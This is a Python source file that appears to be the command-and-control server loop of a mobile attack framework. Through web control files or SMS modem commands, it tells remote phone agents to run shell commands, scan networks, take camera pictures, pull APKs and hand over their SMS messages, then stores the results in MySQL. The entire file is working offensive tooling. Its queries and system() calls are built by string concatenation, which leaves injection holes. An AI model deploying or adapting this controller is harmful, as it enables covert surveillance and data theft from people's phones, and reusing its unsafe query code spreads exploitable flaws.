#!/usr/bin/python
version = "0.1.7"
import os
from os import system
import sys
import re
import serial
from time import sleep
import struct
import MySQLdb
from lib.serial import read_modem
from lib.config import Config
from lib.db import DB, DBException
config = Config('config')

ipaddress = config.get('IPADDRESS')
webserver = config.get('WEBSERVER')
path = sys.argv[1]
key = sys.argv[2]
id = sys.argv[3]
sqlserver = config.get('MYSQLSERVER')

def shift(array):
    return array.pop(0)

def split(separator, string):
    return string.split(separator)

def substr(expr, offset, length):
    return expr[offset:][:length]

while True:
    fullpath = ''
    fullpath5 = webserver + path + "/putfunc"
    PUTFILE = open(fullpath5, 'r+')
    line = PUTFILE.readline()
    PUTFILE.close()
    PUTFILE2 = open(fullpath5, 'w')
    PUTFILE2.write("")
    PUTFILE2.close()
    catcommand = "cat " + fullpath5 + " | sed '1d' > hold"
    system(catcommand)
    catcommand2 = "mv hold " + fullpath
    system(catcommand)
    arsplit = line.split(' ')

    if  arsplit[0] == key :
	if  arsplit[1] == "ROOT" :
            print "ROOT"
	    delivery = arsplit[2]
	    method = arsplit[3]
            method = method.strip()
            command = key + " " + "ROOT " + method
            if  delivery == "http" :

                print "HTTP\n"
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
                sleep(60)
                text = webserver + path + "/text.txt"
                TEXTFILE = open(text, 'r+')
                line     = TEXTFILE.readline()
                table    = "data"
                
                db = DB(config=config)

                yes = line
                db.query("UPDATE " + table + " SET root=" + "'"\
                  + line + "'"\
                  + " WHERE id=" + "'"\
                  + id + "'")

                TEXTFILE.close()
                TEXTFILE2 = open(text, 'w')
                TEXTFILE2.write("")
                TEXTFILE2.close()
            
            if  delivery == "sms" :
                modem = arsplit[3]
                modem = modem.strip()

                db = DB(config=config)
                
                db.query("SELECT path from modems where id=%s", (modem,))
                path2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=%s", (modem,))
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=%s", (id,))
                number2        = db.fetchone()[0]
                db.query("SELECT type from modems where id=%s", (modem,))
                modemtype2     = db.fetchone()[0]

                if  modemtype2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()
                
                elif  modemtype2 == "app" :
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    control = webserver + path2 + "/getfunc"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                sleep(60)
                text = webserver + path + "/text.txt"
                TEXTFILE = open(text, 'r+')
                line = TEXTFILE.readline()
                line = line.strip()

                #print line
                #print "MATCH\n"
                table = "data"
                yes   = "line"
                db.query("UPDATE " + table + "SET root=" + "'" + yes + "'" + " WHERE id=" + "'" + id + "'")
                TEXTFILE.close()
                TEXTFILE2 = open(text, 'w')
                TEXTFILE2.write('')
                TEXTFILE2.close()
	elif  arsplit[1] == "GTIP" :
	    print "GTIP"
            deliverymethod = arsplit[2]
            returnmethod   = arsplit[3]
            returnmethod = returnmethod.strip()
	    deliverymethod = deliverymethod.strip()
            if  returnmethod == "sms" :
                modem = arsplit[4]
                modem = modem.strip()
                
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                command   = key + " " + "GTIP" + " " + "SMS"
                if  deliverymethod == "http" :
                    print "delivery http"
		    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]
	            modemtype2 = modemtype2.strip()
	            print modemtype2	
                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
			usb.write("AT+CMGF=1\r\n")
			sleep(1)
			line = usb.read(255)
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
                        if total != "" :    
			    table    = "data"
                            
                            db = DB(config=config)
                            db.query("UPDATE " + table + " SET ipaddress=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
                        print "app"
			db.query("SELECT path from modems where id=" + modem)
                	path2     = db.fetchone()[0]
                	db.query("SELECT type from modems where id=" + modem)
                	type2     = db.fetchone()[0]
                	db.query("SELECT controlkey from modems where id=" + modem)
                	key2      = db.fetchone()[0]
                	db.query("SELECT number from agents where id=" + id)
                	number2     = db.fetchone()[0]

			sleep(60)

                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
			print line
                        table = "data"
                        db.query("UPDATE "+table+" SET ipaddress=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
	            print "delivery Sms"
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(2)
                        line = usb.read(255)
                        print line
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 
                         	table    = "data" 
                         	db = DB(config=config)
                         	db.query("UPDATE "+table+" SET ipaddress=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
			print "app"
                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command

                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line     = TEXTFILE.readline()
                        table    = "data"
                        print line
                        db = DB(config=config)
                        db.query("UPDATE "+table+" SET ipaddress=" + "'"+ MySQLdb.escape_string(line) + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.close()

            if  returnmethod == "http" :
		print "return http"
                command = key + " " + "GTIP" + " " + "WEB"
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    sleep(30)
                    text = webserver + path + "/text.txt"
                    TEXTFILE = open(text, 'r+')
                    line     = TEXTFILE.readline()
                    print line
		    table    = "data"
                    
                    db = DB(config=config)
                    db.query("UPDATE "+table+" SET ipaddress=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
                    print "Delivery SMS"
		    modem = arsplit[4]
                    modem = modem.strip()
                    db = DB(config=config)
                    db.query("SELECT path from modems where id=" + modem)
                    path2     = db.fetchone()[0]                    
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(10)
                        line = usb.read(255)
                        print line
                        sleep(60)
                    
                    elif  modemtype2 == "app" :
                        command2 = key2 + " " + "SEND" + " "+ number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                    db = DB(config=config)

                    text = webserver + path + "/text.txt"
                    print text
                    TEXTFILE = open(text, 'r+')
                    line  = TEXTFILE.readline()
		    print line
                    table = "data"
                    db.query("UPDATE "+table+" SET ipaddress=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.close()

        elif  arsplit[1] == "UAPK" :
	   print "UAPK"
	   modem  = arsplit[2]
	   deliverymethod = arsplit[3]
           package = arsplit[4]
           command = key + " " + "UAPK" + " " + package
           if  deliverymethod == "http" :
                print "http"
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
	   if  deliverymethod == "sms" :
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()
                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()
           sleep(120)
	   text = webserver + path + "/text.txt"
           TEXTFILE = open(text, 'r+')
           line  = TEXTFILE.readline()
	   apkfile1 = line.strip()
	   apkfile = webserver + path + "/" + apkfile1
	   print apkfile
           APK = open(apkfile, 'r+')
           if  ( os.path.getsize(apkfile) != 0 ) :
                    command = "mv" + " " + apkfile + " " + "."
                    system(command)
                    apkdir = os.getcwd()
                    table      = "data"
                    apk    = apkdir + "/" + apkfile1
		   
                    db = DB(config=config)

                    db.query("UPDATE "+table+" SET apk=" + "'"+ apk +  "'" + " WHERE id=" + "'"+ id + "'")

           APK.close()
 

        elif  arsplit[1] == "EXUP" :
            print "EXUP"
	    modem          = arsplit[2]
            deliverymethod = arsplit[3]
            splitlength    = len(arsplit)
            end            = splitlength - 1
            downloaded     = arsplit[4]
            command1       = arsplit[5]
            if  end > 5 :
                for i in range(6,end+1):
                    command1 += " "
                    command1 += arsplit[i]
                
            
            command = key + " " + "EXUP" + " " + downloaded + " " + command1
            if  deliverymethod == "http" :
		print "http"
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
            
            if  deliverymethod == "sms" :
                db = DB(config=config)
                
                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()

                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()
		
	    sleep(120)
            textfile = webserver + path + "/text.txt"
	    print command1
            if command1.strip() == "pm list packages" :
		 print "Packages"
		 TEXT = open(textfile, 'r+')
		 if  ( os.path.getsize(textfile) != 0) :
			print "file"
		 	linestring = TEXT.read()
			db = DB(config=config)
			table   = "data"
			db.query("UPDATE "+table+" SET packages=" + "'" + linestring + "'" + " WHERE id=" + "'" + id + "'")
                 TEXT.close()
		 TEXT2 = open(textfile, 'w')
                 TEXT2.close()


	    else:
	      TEXT = open(textfile, 'r+')
              if  ( os.path.getsize(textfile) != 0) :
		    db = DB(config=config)
                    command = "cp" + " " + textfile + " " + "."
                    system(command)
                    textdir = os.getcwd()
                    table   = "data"
                    text    = textdir + "/" + "text.txt"
                    db.query("UPDATE "+table+" SET file=" + "'" + text + "'" + " WHERE id=" + "'" + id + "'")
                    TEXT.close()
                    TEXT2 = open(textfile, 'w')
                    TEXT2.close()



	elif arsplit[1] == "NMAP" :
            print "NMAP"
	    modem = arsplit[2]
            deliverymethod = arsplit[3]
            splitlength    = len(arsplit)
            end            = splitlength - 1
            targets    = arsplit[4]
            if  end > 4 :
                for i in range(5, end+1):
                    targets += " "
                    targets += arsplit[i]
            command = key + " " + "NMAP" + " " + targets
	    if  deliverymethod == "http" :
		print "http"
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
                sleep(180)
                textfile = webserver + path + "/text.txt"
                TEXT = open(textfile, 'r+')
                if  ( os.path.getsize(textfile) != 0 ) :
                    command = "cp" + " " + textfile + " " + "."
                    system(command)
                    textdir   = os.getcwd()
                    table     = "data"
                    text      = textdir + "/" + "text.txt"
                    db = DB(config=config)
		    db.query("UPDATE " + table + " SET file=" + "'"+ text + "'"+ " WHERE id=" + "'"+ id + "'")
                    TEXT.close()
                    TEXT2 = open(textfile, 'w')
                    TEXT2.close()
            if  deliverymethod == "sms" :
                modem = modem.strip()
                db = DB(config=config) 
                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2        = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                modemtype2     = db.fetchone()[0]
                if  modemtype2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(2)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()
                
                elif  modemtype2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    CONTROLFILE = open(control, 'w')
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                sleep(180)
                textfile = webserver + path + "/text.txt"
                TEXT = open(textfile, 'r+')
                if  ( os.path.getsize(textfile) != 0) :
                    command = "cp" + " " + textfile + " " + "."
                    system(command)
                    textdir = os.getcwd()
                    table   = "data"
                    text    = textdir + "/" + "text.txt"
                    db.query("UPDATE "+table+" SET file=" + "'" + text + "'" + " WHERE id=" + "'" + id + "'")
                    TEXT.close()
                    TEXT2 = open(textfile, 'w')
                    TEXT2.close()

        elif  arsplit[1] == "PICT" :
            print "PICT\n"
            delivery = arsplit[2]
            delivery = delivery.strip()
            command = key + " " + "PICT"
            if  delivery == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
                sleep(30)
                picturefile = webserver + path + "/picture.jpg"
                PICTURE = open(picturefile, 'r+')
                if  ( os.path.getsize(picturefile) != 0 ) :
                    command = "cp" + " " + picturefile + " " + "."
                    system(command)
                    picturedir = os.getcwd()
                    table      = "data"
                    picture    = picturedir + "/" + "picture.jpg"

                    db = DB(config=config)
                    
                    db.query("UPDATE "+table+" SET picture=" + "'"+ picture + "'"+ " WHERE id=" + "'"+ id + "'")
                    PICTURE.close()
                    PICTURE2 = open(picturefile, 'w')
                    PICTURE2.close()
            
            if  delivery == "sms" :
                modem = arsplit[3]
                modem = modem.strip()
                db = DB(config=config)
                
                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2        = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                modemtype2     = db.fetchone()[0]

                if  modemtype2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(2)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

                
                elif  modemtype2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    CONTROLFILE = open(control, 'w')
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                sleep(60)
                picturefile = webserver + path + "/picture.jpg"
                PICTURE = open(picturefile, 'r+')
                if  ( os.path.getsize( picturefile) != 0 ) :
                    command = "cp" + " " + picturefile + " " + "."
                    system(command)
                    picturedir = os.getcwd()
                    table      = "data"
                    picture    = picturedir + "/" + "picture.jpg"
                    db.query("UPDATE "+table+" SET picture=" + "'" + picture + "'" + " WHERE id=" + "'" + id + "'")
                    PICTURE.close()
                    PICTURE2 = open(picturefile, 'w')
                    PICTURE2.close()
        
        elif  arsplit[1] == "SMSS" :
	    print "SMSS"
            deliverymethod = arsplit[2]
            returnmethod   = arsplit[3]
            returnmethod = returnmethod.strip()
	    deliverymethod = deliverymethod.strip()
            if  returnmethod == "sms" :
                modem = arsplit[4]
                modem = modem.strip()
                
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                command   = key + " " + "SMSS" + " " + "SMS"
                if  deliverymethod == "http" :
                    print "delivery http"
		    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]
	            modemtype2 = modemtype2.strip()
	            print modemtype2	
                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
			usb.write("AT+CMGF=1\r\n")
			sleep(1)
			line = usb.read(255)
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
                        if total != "" :    
			    table    = "data"
                            
                            db = DB(config=config)
                            db.query("UPDATE " + table + " SET sms=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
                        print "app"
			db.query("SELECT path from modems where id=" + modem)
                	path2     = db.fetchone()[0]
                	db.query("SELECT type from modems where id=" + modem)
                	type2     = db.fetchone()[0]
                	db.query("SELECT controlkey from modems where id=" + modem)
                	key2      = db.fetchone()[0]
                	db.query("SELECT number from agents where id=" + id)
                	number2     = db.fetchone()[0]

			sleep(60)

                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
			print line
                        table = "data"
                        db.query("UPDATE "+table+" SET sms=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
	            print "delivery Sms"
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(2)
                        line = usb.read(255)
                        print line
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 
                         	table    = "data" 
                         	db = DB(config=config)
                         	db.query("UPDATE "+table+" SET sms=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
			print "app"
                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command

                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line     = TEXTFILE.readline()
                        table    = "data"
                        print line
                        db = DB(config=config)
                        db.query("UPDATE "+table+" SET sms=" + "'"+ MySQLdb.escape_string(line) + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.close()

            if  returnmethod == "http" :
		print "return http"
                command = key + " " + "SMSS" + " " + "WEB"
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    sleep(30)
                    text = webserver + path + "/text.txt"
                    TEXTFILE = open(text, 'r+')
                    line     = TEXTFILE.readline()
                    print line
		    table    = "data"
                    
                    db = DB(config=config)
                    db.query("UPDATE "+table+" SET sms=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
                    print "Delivery SMS"
		    modem = arsplit[4]
                    modem = modem.strip()
                    db = DB(config=config)
                    db.query("SELECT path from modems where id=" + modem)
                    path2     = db.fetchone()[0]                    
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(10)
                        line = usb.read(255)
                        print line
                        sleep(60)
                    
                    elif  modemtype2 == "app" :
                        command2 = key2 + " " + "SEND" + " "+ number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                    db = DB(config=config)

                    text = webserver + path + "/text.txt"
                    print text
                    TEXTFILE = open(text, 'r+')
                    line  = TEXTFILE.readline()
		    print line
                    table = "data"
                    db.query("UPDATE "+table+" SET sms=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
